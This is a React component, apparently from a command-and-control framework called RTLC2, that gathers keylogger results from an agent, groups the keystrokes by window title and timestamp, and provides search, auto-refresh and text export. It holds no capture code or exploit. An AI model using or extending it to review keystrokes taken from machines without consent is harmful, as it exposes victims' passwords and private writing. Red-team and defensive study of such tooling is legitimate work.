// ═══════════════════════════════════════════════════════════════
//  RTLC2 Keylogger Viewer
//  Timeline view of keylogger output grouped by window title
//  and timestamp. Search/filter, export, auto-refresh.
// ═══════════════════════════════════════════════════════════════

import { useState, useEffect, useCallback, useRef } from 'react';
import { api } from '../../api/client';
import type { TaskResult } from '../../types';
import { TaskType, TaskStatus } from '../../types';

interface KeyloggerViewerProps {
  agentId: string;
}

interface KeylogSection {
  windowTitle: string;
  timestamp: string;
  keystrokes: string;
}

// Parse keylogger output into sections grouped by window title
// Expected format:
//   [2024-01-01 12:00:00] Window: notepad.exe - Untitled
//   keystrokes here...
//   [2024-01-01 12:01:00] Window: chrome.exe - Google
//   more keystrokes...
function parseKeylogOutput(raw: string): KeylogSection[] {
  const sections: KeylogSection[] = [];
  const lines = raw.split('\n');
  let current: KeylogSection | null = null;

  const headerRe = /^\[([^\]]+)\]\s*(?:Window:\s*)?(.+)$/;

  for (const line of lines) {
    const match = line.match(headerRe);
    if (match) {
      if (current) sections.push(current);
      current = {
        timestamp: match[1].trim(),
        windowTitle: match[2].trim(),
        keystrokes: '',
      };
    } else if (current) {
      current.keystrokes += (current.keystrokes ? '\n' : '') + line;
    } else {
      // No header yet, create a default section
      current = {
        timestamp: new Date().toISOString(),
        windowTitle: '(Unknown Window)',
        keystrokes: line,
      };
    }
  }

  if (current) sections.push(current);
  return sections;
}

export default function KeyloggerViewer({ agentId }: KeyloggerViewerProps) {
  const [sections, setSections] = useState<KeylogSection[]>([]);
  const [rawOutput, setRawOutput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [autoRefresh, setAutoRefresh] = useState(false);
  const autoRefreshRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Cleanup auto-refresh on unmount
  useEffect(() => {
    return () => {
      if (autoRefreshRef.current) clearInterval(autoRefreshRef.current);
    };
  }, []);

  const fetchKeylogs = useCallback(async () => {
    setIsLoading(true);
    setError(null);

    try {
      const res = await api.getAgentTasks(agentId);
      const tasks = (res.tasks || []).filter(
        (t) => t.type === TaskType.KEYLOG
      );

      let allOutput = '';

      for (const task of tasks) {
        try {
          const result: TaskResult = await api.getTaskResult(task.task_id);
          if (result.status !== TaskStatus.COMPLETE || !result.output) continue;

          const decoded = atob(result.output);
          allOutput += (allOutput ? '\n' : '') + decoded;
        } catch {
          // Skip failed tasks
        }
      }

      setRawOutput(allOutput);
      setSections(parseKeylogOutput(allOutput));
    } catch (err: any) {
      setError(err.message || 'Failed to fetch keylogger data');
    } finally {
      setIsLoading(false);
    }
  }, [agentId]);

  useEffect(() => {
    fetchKeylogs();
  }, [fetchKeylogs]);

  // Auto-refresh toggle
  useEffect(() => {
    if (autoRefresh) {
      autoRefreshRef.current = setInterval(fetchKeylogs, 10000);
    } else {
      if (autoRefreshRef.current) {
        clearInterval(autoRefreshRef.current);
        autoRefreshRef.current = null;
      }
    }
    return () => {
      if (autoRefreshRef.current) clearInterval(autoRefreshRef.current);
    };
  }, [autoRefresh, fetchKeylogs]);

  // Filter sections by search query
  const filteredSections = searchQuery
    ? sections.filter(
        (s) =>
          s.keystrokes.toLowerCase().includes(searchQuery.toLowerCase()) ||
          s.windowTitle.toLowerCase().includes(searchQuery.toLowerCase())
      )
    : sections;

  const handleExport = () => {
    const content = sections
      .map(
        (s) =>
          `=== [${s.timestamp}] ${s.windowTitle} ===\n${s.keystrokes}\n`
      )
      .join('\n');
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `keylog_${agentId.slice(0, 8)}_${new Date().toISOString().slice(0, 10)}.txt`;
    link.click();
    URL.revokeObjectURL(url);
  };

  // Highlight search matches in text
  const highlightMatch = (text: string): React.ReactNode => {
    if (!searchQuery) return text;
    const parts = text.split(new RegExp(`(${searchQuery.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'gi'));
    return parts.map((part, i) =>
      part.toLowerCase() === searchQuery.toLowerCase() ? (
        <span key={i} style={{ background: '#cc000044', color: '#ff4444', borderRadius: '2px', padding: '0 1px' }}>
          {part}
        </span>
      ) : (
        part
      )
    );
  };

  // ── Styles ──────────────────────────────────────────────────

  const containerStyle: React.CSSProperties = {
    display: 'flex',
    flexDirection: 'column',
    height: '100%',
    background: '#0a0a0a',
    color: '#e0e0e0',
  };

  const toolbarStyle: React.CSSProperties = {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
    padding: '8px 12px',
    borderBottom: '1px solid #222',
    background: '#111',
    flexShrink: 0,
    flexWrap: 'wrap',
  };

  const btnStyle: React.CSSProperties = {
    padding: '4px 12px',
    background: '#1a1a1a',
    border: '1px solid #333',
    borderRadius: '3px',
    color: '#e0e0e0',
    cursor: 'pointer',
    fontSize: '12px',
    fontFamily: 'inherit',
  };

  const btnAccentStyle: React.CSSProperties = {
    ...btnStyle,
    background: '#cc0000',
    borderColor: '#cc0000',
    color: '#fff',
  };

  const inputStyle: React.CSSProperties = {
    padding: '4px 8px',
    background: '#0a0a0a',
    border: '1px solid #333',
    borderRadius: '3px',
    color: '#e0e0e0',
    fontSize: '12px',
    fontFamily: 'inherit',
    outline: 'none',
    width: '220px',
  };

  const timelineStyle: React.CSSProperties = {
    flex: 1,
    overflow: 'auto',
    padding: '12px',
  };

  const sectionStyle: React.CSSProperties = {
    marginBottom: '16px',
    border: '1px solid #1a1a1a',
    borderRadius: '4px',
    background: '#0d0d0d',
    overflow: 'hidden',
  };

  const sectionHeaderStyle: React.CSSProperties = {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    padding: '6px 10px',
    background: '#111',
    borderBottom: '1px solid #1a1a1a',
    fontSize: '12px',
  };

  const keystrokeStyle: React.CSSProperties = {
    padding: '8px 10px',
    fontFamily: '"Cascadia Code", "Fira Code", "Consolas", monospace',
    fontSize: '12px',
    lineHeight: 1.6,
    whiteSpace: 'pre-wrap',
    wordBreak: 'break-all',
    color: '#b0b0b0',
  };

  const emptyStyle: React.CSSProperties = {
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    height: '100%',
    color: '#444',
    fontSize: '14px',
    gap: '8px',
  };

  // ── Render ──────────────────────────────────────────────────

  return (
    <div style={containerStyle}>
      {/* Toolbar */}
      <div style={toolbarStyle}>
        <span style={{ fontSize: '13px', fontWeight: 600, color: '#cc0000' }}>
          Keylogger
        </span>
        <span style={{ fontSize: '11px', color: '#555' }}>
          ({sections.length} sections)
        </span>
        <div style={{ flex: 1 }} />
        <input
          type="text"
          placeholder="Search keystrokes..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          style={inputStyle}
          onFocus={(e) => { e.currentTarget.style.borderColor = '#cc0000'; }}
          onBlur={(e) => { e.currentTarget.style.borderColor = '#333'; }}
        />
        <button
          style={autoRefresh ? btnAccentStyle : btnStyle}
          onClick={() => setAutoRefresh(!autoRefresh)}
          title={autoRefresh ? 'Stop auto-refresh' : 'Start auto-refresh (10s)'}
        >
          {autoRefresh ? 'Auto: ON' : 'Auto: OFF'}
        </button>
        <button
          style={btnStyle}
          onClick={fetchKeylogs}
          disabled={isLoading}
        >
          {isLoading ? 'Loading...' : 'Refresh'}
        </button>
        <button
          style={btnStyle}
          onClick={handleExport}
          disabled={sections.length === 0}
        >
          Export TXT
        </button>
      </div>

      {/* Error */}
      {error && (
        <div
          style={{
            padding: '6px 12px',
            background: '#1a0000',
            borderBottom: '1px solid #330000',
            color: '#cc0000',
            fontSize: '11px',
            flexShrink: 0,
          }}
        >
          {error}
        </div>
      )}

      {/* Timeline */}
      {filteredSections.length === 0 && !isLoading ? (
        <div style={emptyStyle}>
          <span style={{ fontSize: '32px', opacity: 0.3 }}>&gt;_</span>
          <span>
            {searchQuery
              ? 'No keystrokes match your search'
              : 'No keylogger data captured yet'}
          </span>
          <span style={{ fontSize: '11px', color: '#333' }}>
            {searchQuery
              ? 'Try a different search term'
              : 'Use "keylog start" to begin capturing keystrokes'}
          </span>
        </div>
      ) : (
        <div style={timelineStyle}>
          {filteredSections.map((section, idx) => (
            <div key={idx} style={sectionStyle}>
              <div style={sectionHeaderStyle}>
                <span style={{ color: '#cc0000', fontWeight: 600 }}>
                  {highlightMatch(section.windowTitle)}
                </span>
                <span
                  style={{
                    fontFamily: 'monospace',
                    fontSize: '10px',
                    color: '#555',
                  }}
                >
                  {section.timestamp}
                </span>
              </div>
              <div style={keystrokeStyle}>
                {highlightMatch(section.keystrokes)}
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Status Bar */}
      <div
        style={{
          padding: '4px 12px',
          borderTop: '1px solid #222',
          background: '#111',
          fontSize: '10px',
          color: '#444',
          fontFamily: 'monospace',
          display: 'flex',
          justifyContent: 'space-between',
          flexShrink: 0,
        }}
      >
        <span>
          {rawOutput.length > 0
            ? `${rawOutput.length} chars total`
            : 'No data'}
        </span>
        <span>
          {autoRefresh ? 'Auto-refresh: 10s' : 'Manual refresh'}
        </span>
      </div>
    </div>
  );
}
